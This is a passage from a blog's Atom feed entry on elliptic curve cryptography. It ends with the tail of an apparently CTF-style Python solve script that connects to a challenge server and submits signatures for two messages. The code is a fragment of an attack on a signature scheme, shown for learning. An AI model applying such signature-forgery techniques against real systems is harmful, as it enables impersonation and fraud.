successfully!&quot;</span> <span class="keyword">in</span> recv():</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;msg2 verify successfully!&quot;</span>)</span><br><span class="line"></span><br><span class="line">send(<span class="string">&quot;Please choice your options:&quot;</span>, <span class="string">&quot;6&quot;</span>)</span><br><span class="line">send(<span class="string">&quot;Please give me the signature(hex) of the frist message:&quot;</span>, sign.encode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line">send(<span class="string">&quot;Please give me the signature(hex) of the second message:&quot;</span>, sign.encode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">sendHash()</span><br><span class="line">msg1, msg2 = getMessage()</span><br><span class="line">calculator(msg1, msg2)</span><br><span class="line">r.recvuntil(<span class="string">&quot;&#125;&quot;</span>)</span><br><span class="line">r.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;ECC&quot;&gt;&lt;a href=&quot;#ECC&quot; class=&quot;headerlink&quot; title=&quot;ECC&quot;&gt;&lt;/a&gt;ECC&lt;/h2&gt;&lt;p&gt;椭圆曲线密码学（英语：Elliptic Curve Cryptography，缩写：ECC）是一种基于椭圆曲线数学的公开密钥加密算法</summary>
      
    
    
    
    <category term="crypto" scheme="https://lazzzaro.github.io/categories/crypto/"/>
    
    
    <category term="ECC" scheme="https://lazzzaro.github.io/tags/ECC/"/>
    
  </entry>
  
</feed>
